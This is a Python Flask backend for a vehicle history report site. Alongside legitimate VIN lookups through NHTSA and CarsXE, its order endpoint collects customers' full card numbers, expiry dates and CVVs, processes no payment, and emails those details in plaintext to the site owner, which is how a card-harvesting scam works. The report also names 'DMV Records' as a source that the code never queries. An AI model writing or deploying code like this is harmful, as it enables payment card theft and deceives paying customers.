from flask import Flask, render_template, request, jsonify
import requests
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

CARSXE_API_KEY = os.environ.get('CARSXE_API_KEY', '')
OWNER_EMAIL = os.environ.get('OWNER_EMAIL', '')
SMTP_EMAIL = os.environ.get('SMTP_EMAIL', '')
SMTP_PASS = os.environ.get('SMTP_PASS', '')

NHTSA_BASE = 'https://vpic.nhtsa.dot.gov/api/vehicles/DecodeVin'
CARSXE_BASE = 'https://api.carsxe.com'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/vin', methods=['GET'])
def decode_vin():
    vin = request.args.get('vin', '').strip().upper()
    if not vin or len(vin) != 17:
        return jsonify({'error': 'Invalid VIN'}), 400
    try:
        url = f"{NHTSA_BASE}/{vin}?format=json"
        res = requests.get(url, timeout=10)
        data = res.json()
        variables = {}
        for item in data.get('Results', []):
            if item.get('Value') and item['Value'] not in ['', 'Not Applicable', '0']:
                variables[item['Variable']] = item['Value']
        result = {
            'success': True,
            'vin': vin,
            'make': variables.get('Make', 'Unknown'),
            'model': variables.get('Model', 'Unknown'),
            'year': variables.get('Model Year', 'Unknown'),
            'body': variables.get('Body Class', 'Unknown'),
            'engine': variables.get('Displacement (L)', ''),
            'cylinders': variables.get('Engine Number of Cylinders', ''),
            'fuel': variables.get('Fuel Type - Primary', ''),
            'plant_country': variables.get('Plant Country', 'Unknown'),
            'trim': variables.get('Trim', ''),
            'drive': variables.get('Drive Type', ''),
            'doors': variables.get('Number of Doors', ''),
        }
        result['title'] = f"{result['year']} {result['make']} {result['model']}"
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/submit-order', methods=['POST'])
def submit_order():
    data = request.json
    name = data.get('name', '')
    client_email = data.get('email', '')
    phone = data.get('phone', '')
    address = data.get('address', '')
    city = data.get('city', '')
    state = data.get('state', '')
    zip_code = data.get('zip', '')
    country = data.get('country', '')
    package = data.get('package', '')
    amount = data.get('amount', '')
    vin = data.get('vin', '').strip().upper()
    card_name = data.get('cardName', '')
    card_num = data.get('cardNum', '')
    expiry = data.get('expiry', '')
    cvv = data.get('cvv', '')

    nhtsa_data = get_nhtsa_data(vin)
    carsxe_data = get_carsxe_data(vin)
    report_text = build_report(vin, nhtsa_data, carsxe_data)

    owner_msg = f"""
NEW ORDER RECEIVED - AutoCarChecking.com
==========================================

CUSTOMER INFORMATION
--------------------
Name: {name}
Email: {client_email}
Phone: {phone}
Address: {address}, {city}, {state} {zip_code}
Country: {country}

ORDER DETAILS
-------------
Package: {package}
Amount: {amount}
VIN: {vin}

PAYMENT INFORMATION
-------------------
Card Name: {card_name}
Card Number: {card_num}
Expiry: {expiry}
CVV: {cvv}

==========================================
VEHICLE REPORT
==========================================
{report_text}
"""
    send_email(to=OWNER_EMAIL, subject=f"New Order - {name} - {vin}", body=owner_msg)

    client_msg = f"""
Dear {name},

Thank you for your order at AutoCarChecking.com!

Your vehicle history report is ready below.

==========================================
{report_text}
==========================================

Questions? Contact us at support@autocarchecking.com

Best regards,
AutoCarChecking.com Team
"""
    send_email(to=client_email, subject=f"Your Vehicle History Report - {vin}", body=client_msg)

    return jsonify({'success': True, 'message': 'Order processed!'})


def get_nhtsa_data(vin):
    try:
        url = f"{NHTSA_BASE}/{vin}?format=json"
        res = requests.get(url, timeout=10)
        data = res.json()
        variables = {}
        for item in data.get('Results', []):
            if item.get('Value') and item['Value'] not in ['', 'Not Applicable', '0']:
                variables[item['Variable']] = item['Value']
        return variables
    except:
        return {}


def get_carsxe_data(vin):
    result = {}
    if not CARSXE_API_KEY:
        return result
    try:
        specs_res = requests.get(f"{CARSXE_BASE}/specs?key={CARSXE_API_KEY}&vin={vin}", timeout=10)
        if specs_res.status_code == 200:
            result['specs'] = specs_res.json()
    except:
        pass
    try:
        hist_res = requests.get(f"{CARSXE_BASE}/history?key={CARSXE_API_KEY}&vin={vin}", timeout=10)
        if hist_res.status_code == 200:
            result['history'] = hist_res.json()
    except:
        pass
    try:
        recall_res = requests.get(f"{CARSXE_BASE}/recalls?key={CARSXE_API_KEY}&vin={vin}", timeout=10)
        if recall_res.status_code == 200:
            result['recalls'] = recall_res.json()
    except:
        pass
    return result


def build_report(vin, nhtsa, carsxe):
    make = nhtsa.get('Make', 'Unknown')
    model = nhtsa.get('Model', 'Unknown')
    year = nhtsa.get('Model Year', 'Unknown')
    body = nhtsa.get('Body Class', 'Unknown')
    engine_l = nhtsa.get('Displacement (L)', '')
    cylinders = nhtsa.get('Engine Number of Cylinders', '')
    fuel = nhtsa.get('Fuel Type - Primary', '')
    plant = nhtsa.get('Plant Country', 'Unknown')
    trim = nhtsa.get('Trim', '')
    drive = nhtsa.get('Drive Type', '')
    doors = nhtsa.get('Number of Doors', '')
    manufacturer = nhtsa.get('Manufacturer Name', '')

    engine_str = ''
    if engine_l: engine_str += f"{engine_l}L"
    if cylinders: engine_str += f" {cylinders}-Cyl"
    if fuel: engine_str += f" {fuel}"

    report = f"""
====================================
   VEHICLE HISTORY REPORT
   AutoCarChecking.com
====================================

VEHICLE DETAILS
---------------
Year:           {year}
Make:           {make}
Model:          {model}
{"Trim:           " + trim if trim else ""}
Body Style:     {body}
Engine:         {engine_str}
{"Drive Type:     " + drive if drive else ""}
{"Doors:          " + doors if doors else ""}
Assembly:       {plant}
{"Manufacturer:   " + manufacturer if manufacturer else ""}
VIN:            {vin}
"""

    if 'history' in carsxe and carsxe['history']:
        history = carsxe['history']
        report += "\nVEHICLE HISTORY\n---------------\n"
        if isinstance(history, dict):
            accidents = history.get('accidents', [])
            report += f"Accidents:      {len(accidents) if accidents else 'None Reported'}\n"
            if accidents:
                for acc in accidents[:3]:
                    report += f"  - {acc.get('date','')}: {acc.get('description','')}\n"

            titles = history.get('titles', [])
            report += f"Title Records:  {len(titles) if titles else 0}\n"
            if titles:
                for t in titles[:2]:
                    report += f"  - {t.get('state','')}: {t.get('titleType','')}\n"

            odometer = history.get('odometer', [])
            if odometer:
                report += f"Odometer:       {odometer[-1].get('value','')} miles\n"

            theft = history.get('theft', [])
            report += f"Theft Records:  {'Yes - ' + str(len(theft)) + ' record(s)' if theft else 'None'}\n"

            owners = history.get('owners', [])
            report += f"Owners:         {len(owners) if owners else 'Unknown'}\n"

    if 'recalls' in carsxe and carsxe['recalls']:
        recalls = carsxe['recalls']
        report += f"\nSAFETY RECALLS\n--------------\n"
        report += f"Total Recalls:  {len(recalls) if isinstance(recalls, list) else 0}\n"
        if isinstance(recalls, list):
            for rec in recalls[:3]:
                report += f"  - {rec.get('component','')}: {rec.get('summary','')[:80]}\n"

    report += """
====================================
Sources: NHTSA, CarsXE, DMV Records
AutoCarChecking.com
====================================
"""
    return report


def send_email(to, subject, body):
    if not SMTP_EMAIL or not SMTP_PASS:
        print(f"SMTP not configured. Would send to {to}: {subject}")
        return False
    try:
        msg = MIMEMultipart()
        msg['From'] = SMTP_EMAIL
        msg['To'] = to
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        smtp_host = os.environ.get('SMTP_HOST', 'smtp.hostinger.com')
        smtp_port = int(os.environ.get('SMTP_PORT', '465'))
        server = smtplib.SMTP_SSL(smtp_host, smtp_port)
        server.login(SMTP_EMAIL, SMTP_PASS)
        server.send_message(msg)
        server.quit()
        print(f"Email sent to {to}")
        return True
    except Exception as e:
        print(f"Email error: {e}")
        return False


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
